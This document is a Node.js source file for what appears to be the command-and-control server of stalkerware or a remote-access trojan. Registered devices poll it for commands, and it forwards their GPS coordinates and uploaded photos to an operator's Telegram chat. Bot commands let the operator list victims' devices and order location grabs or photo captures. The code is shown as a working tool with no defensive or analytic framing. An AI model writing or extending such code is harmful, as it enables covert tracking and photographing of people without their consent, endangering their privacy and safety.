const express = require('express');
const axios = require('axios');
const multer = require('multer');
const { Telegraf } = require('telegraf');

const app = express();
const upload = multer({ dest: 'uploads/' });
const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');

let devices = {}; // Stores active devices
let commands = {}; // Stores pending commands

// Register device
app.get('/register', (req, res) => {
    const deviceId = req.query.device_id;
    devices[deviceId] = true;
    res.send("Device registered");
});

// Get pending command
app.get('/get_command', (req, res) => {
    const deviceId = req.query.device_id;
    res.send(commands[deviceId] || "");
    commands[deviceId] = ""; // Clear command after sending
});

// Receive location
app.get('/send_location', (req, res) => {
    const { device_id, lat, lon } = req.query;
    bot.telegram.sendMessage('YOUR_TELEGRAM_CHAT_ID', `📍 Location from ${device_id}: https://maps.google.com/?q=${lat},${lon}`);
    res.send("Location sent");
});

// Receive photo
app.post('/send_photo', upload.single('photo'), (req, res) => {
    bot.telegram.sendPhoto('YOUR_TELEGRAM_CHAT_ID', { source: req.file.path });
    res.send("Photo sent");
});

// Telegram bot commands
bot.command('list', (ctx) => {
    let message = "Active Devices:\n";
    for (let device in devices) {
        message += `- ${device}\n`;
    }
    ctx.reply(message);
});

bot.command('get_location', (ctx) => {
    const deviceId = ctx.message.text.split(" ")[1];
    commands[deviceId] = "get_location";
    ctx.reply(`📍 Requested location from ${deviceId}`);
});

bot.command('take_photo', (ctx) => {
    const deviceId = ctx.message.text.split(" ")[1];
    commands[deviceId] = "take_photo";
    ctx.reply(`📸 Requested photo from ${deviceId}`);
});

bot.launch();

app.listen(3000, () => console.log("Server running on port 3000"));
